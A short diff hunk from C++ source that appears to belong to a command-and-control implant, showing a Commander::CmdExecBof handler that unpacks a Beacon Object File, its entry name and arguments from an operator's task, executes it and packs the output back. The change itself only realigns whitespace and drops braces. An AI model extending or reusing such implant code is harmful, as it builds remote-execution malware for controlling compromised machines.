@@ -288,17 +288,16 @@ void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outP
 void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG entrySize = 0;
-	BYTE* entry = inPacker->UnpackBytes(&entrySize);
-	ULONG bofSize  = 0;
-	BYTE* bof      = inPacker->UnpackBytes(&bofSize);
-	ULONG argsSize = 0;
-	BYTE* args     = inPacker->UnpackBytes(&argsSize);
-	ULONG taskId   = inPacker->Unpack32();
+	BYTE* entry     = inPacker->UnpackBytes(&entrySize);
+	ULONG bofSize   = 0;
+	BYTE* bof       = inPacker->UnpackBytes(&bofSize);
+	ULONG argsSize  = 0;
+	BYTE* args      = inPacker->UnpackBytes(&argsSize);
+	ULONG taskId    = inPacker->Unpack32();
 
 	Packer* bofPacker = ObjectExecute(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
-	if (bofPacker->GetDataSize() > 8) {
+	if (bofPacker->GetDataSize() > 8)
 		outPacker->PackFlatBytes(bofPacker->GetData(), bofPacker->GetDataSize());
-	}
 
 	outPacker->Pack32(taskId);
 	outPacker->Pack32(commandId);
